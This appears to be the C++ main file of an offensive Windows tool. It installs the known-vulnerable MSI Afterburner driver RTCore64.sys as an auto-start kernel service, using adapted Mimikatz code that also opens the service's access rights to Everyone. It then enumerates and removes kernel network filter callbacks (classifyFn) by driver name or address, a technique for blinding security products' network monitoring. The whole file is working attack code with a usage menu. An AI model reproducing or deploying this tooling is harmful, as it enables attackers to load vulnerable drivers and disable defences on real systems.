#include <Windows.h>
#include "memory.h"
#include "netUtil.h"

//Mimikatz code to load / unload driver
BOOL kull_m_service_addWorldToSD(SC_HANDLE monHandle) {
	BOOL status = FALSE;
	DWORD dwSizeNeeded;
	PSECURITY_DESCRIPTOR oldSd, newSd;
	SECURITY_DESCRIPTOR dummySdForXP;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	EXPLICIT_ACCESS ForEveryOne = {
		SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
		SET_ACCESS,
		NO_INHERITANCE,
		{NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}
	};
	if (!QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER)) {
		if (oldSd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSizeNeeded)) {
			if (QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded)) {
				if (AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&ForEveryOne.Trustee.ptstrName)) {
					if (BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryOne, 0, NULL, oldSd, &dwSizeNeeded, &newSd) == ERROR_SUCCESS) {
						status = SetServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, newSd);
						LocalFree(newSd);
					}
					FreeSid(ForEveryOne.Trustee.ptstrName);
				}
			}
			LocalFree(oldSd);
		}
	}
	return status;
}

DWORD service_install(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt) {
	BOOL status = FALSE;
	SC_HANDLE hSC = NULL, hS = NULL;

	if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE)) {
		if (hS = OpenService(hSC, serviceName, SERVICE_START)) {
			wprintf(L"[+] \'%s\' service already registered\n", serviceName);
		}
		else {
			if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
				wprintf(L"[*] \'%s\' service not present\n", serviceName);
				if (hS = CreateService(hSC, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL)) {
					wprintf(L"[+] \'%s\' service successfully registered\n", serviceName);
					if (status = kull_m_service_addWorldToSD(hS))
						wprintf(L"[+] \'%s\' service ACL to everyone\n", serviceName);
					else printf("kull_m_service_addWorldToSD");
				}
				else PRINT_ERROR_AUTO(L"CreateService");
			}
			else PRINT_ERROR_AUTO(L"OpenService");
		}
		if (hS) {
			if (startIt) {
				if (status = StartService(hS, 0, NULL))
					wprintf(L"[+] \'%s\' service started\n", serviceName);
				else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
					wprintf(L"[*] \'%s\' service already started\n", serviceName);
				else {
					PRINT_ERROR_AUTO(L"StartService");
				}
			}
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	else {
		PRINT_ERROR_AUTO(L"OpenSCManager(create)");
		return GetLastError();
	}
	return 0;
}

BOOL kull_m_service_genericControl(PCWSTR serviceName, DWORD dwDesiredAccess, DWORD dwControl, LPSERVICE_STATUS ptrServiceStatus) {
	BOOL status = FALSE;
	SC_HANDLE hSC, hS;
	SERVICE_STATUS serviceStatus;

	if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
		if (hS = OpenService(hSC, serviceName, dwDesiredAccess)) {
			status = ControlService(hS, dwControl, ptrServiceStatus ? ptrServiceStatus : &serviceStatus);
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	return status;
}

BOOL service_uninstall(PCWSTR serviceName) {
	if (kull_m_service_genericControl(serviceName, SERVICE_STOP, SERVICE_CONTROL_STOP, NULL)) {
		wprintf(L"[+] \'%s\' service stopped\n", serviceName);
	}
	else if (GetLastError() == ERROR_SERVICE_NOT_ACTIVE) {
		wprintf(L"[*] \'%s\' service not running\n", serviceName);
	}
	else {
		PRINT_ERROR_AUTO(L"kull_m_service_stop");
		return FALSE;
	}

	if (SC_HANDLE hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
		if (SC_HANDLE hS = OpenService(hSC, serviceName, DELETE)) {
			BOOL status = DeleteService(hS);
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	return TRUE;
}
// thanks gentilkiwi!

int main(int argc, char** argv) {
	if (argc < 2) {
		printf("Usage: %s\n"
			" /networkfilters /show <drivername> - list all network filters or network filters related to a driver\n"
			" /networkfilters /driver <drivername> - Remove all classifyFn related to that driver\n"
			" /networkfilters /address <classyFn Address To Remove> - remove the classifyFn Address mentionned (make sure to add 0x before the address)\n"
			" /installDriver - Install the MSI driver\n"
			" /uninstallDriver - Uninstall the MSI driver\n"
			, argv[0]);
		return 0;
	}

	if (strcmp(argv[1] + 1, "installDriver") == 0) {
		const auto svcName = L"RTCore64";
		const auto svcDesc = L"Micro-Star MSI Afterburner";
		const wchar_t driverName[] = L"\\RTCore64.sys";
		const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
		TCHAR driverPath[pathSize];
		GetCurrentDirectory(pathSize, driverPath);
		wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));

		if (auto status = service_install(svcName, svcDesc, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE) == 0x00000005) {
			wprintf(L"[!] 0x00000005 - Access Denied - Did you run as administrator?\n");
		}
		return 0;
	}
	else if (strcmp(argv[1] + 1, "uninstallDriver") == 0) {
		const auto svcName = L"RTCore64";
		const auto svcDesc = L"Micro-Star MSI Afterburner";
		const wchar_t driverName[] = L"\\RTCore64.sys";
		const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
		TCHAR driverPath[pathSize];
		GetCurrentDirectory(pathSize, driverPath);
		wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));
		service_uninstall(svcName);
		return 0;
	}

	char* strFilterName = (char*) "test";
	char* strDriverName;
	UCHAR indexToRemove = 0;
	DWORD64 AddressToRemove = 0x00;

	if (!strcmp(argv[1] + 1, "networkfilters") && argv[2] != NULL && !strcmp(argv[2] + 1, "address") && argc > 3 && argv[3] != NULL) {
		AddressToRemove = (DWORD64) argv[3];
	}

	Memory m = Memory();
	NetworkManager oFlt = NetworkManager(&m);

	if (!strcmp(argv[1] + 1, "networkfilters") && !strcmp(argv[2] + 1, "show")) {
		if (argc > 3 && argv[3] != NULL) {
			strDriverName = argv[3];
			wchar_t* wstrDriverName = new wchar_t[strlen(strDriverName) + 2];
			size_t numConv = 0;
			mbstowcs_s(&numConv, wstrDriverName, strlen(strDriverName) + 2, strDriverName, strlen(strDriverName));
			printf("Enumerating for driver %S\n", strDriverName);

			oFlt.EnumerateNetworkFilters(false, wstrDriverName);
		}
		else {
			oFlt.EnumerateNetworkFilters(false);
		}
	}

	if (!strcmp(argv[1] + 1, "networkfilters") && (!strcmp(argv[2] + 1, "driver") || !strcmp(argv[2] + 1, "address"))) {
		if (!strcmp(argv[2] + 1, "driver") && argc > 3 && argv[3] != NULL) {
			strDriverName = argv[3];
			wchar_t* wstrDriverName = new wchar_t[strlen(strDriverName) + 2];
			size_t numConv = 0;
			mbstowcs_s(&numConv, wstrDriverName, strlen(strDriverName) + 2, strDriverName, strlen(strDriverName));
			printf("Enumerating for driver %S\n", strDriverName);

			oFlt.EnumerateNetworkFilters(true, wstrDriverName);
			printf("Press Enter To Restore");
			Sleep(2000);
			getchar();
			BOOL res = oFlt.Restore();
		}
		if (!strcmp(argv[2] + 1, "address") && argc > 3 && argv[3] != NULL) {
			DWORD64 address = 0x00;
			sscanf_s(argv[3], "0x%llx", &address);
			printf("Enumerating for address %llx\n", address);
			oFlt.EnumerateNetworkFilters(true, NULL, address);
			printf("Press Enter To Restore");
			Sleep(2000);
			getchar();
			BOOL res = oFlt.Restore();
		}
	}

	return 0;
}